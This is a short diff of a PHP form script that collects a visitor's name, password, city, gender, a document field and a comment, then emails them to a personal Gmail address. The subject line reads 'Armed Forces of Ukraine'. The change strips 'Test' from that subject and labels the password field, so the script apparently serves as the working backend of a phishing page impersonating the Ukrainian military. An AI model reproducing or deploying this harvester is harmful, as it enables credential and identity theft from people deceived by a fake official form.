@@ -5,7 +5,7 @@
     $woman = $_POST["man"];
     $document = $_POST["document"];
     $coment = $_POST["koment"];
-    $pidpus = "Збройні Сили України Test";
-    $forma1 ="<br>".$name."<br>".$pasword."<br>".$city."<br>".$woman."<br>".$document."<br>".$coment;
+    $pidpus = "Збройні Сили України";
+    $forma1 ="ФІО: ".$name."<br>"."Пароль: ".$pasword."<br>"."Місто: ".$city."<br>"."Стать: ".$woman."<br>".$document."<br>"."Коментарій: ".$coment;
 mail("darkopasha@gmail.com", "$pidpus", $forma1, "Content-type: text/html; charset=utf-8 \r\n");
 echo("Відправлено");
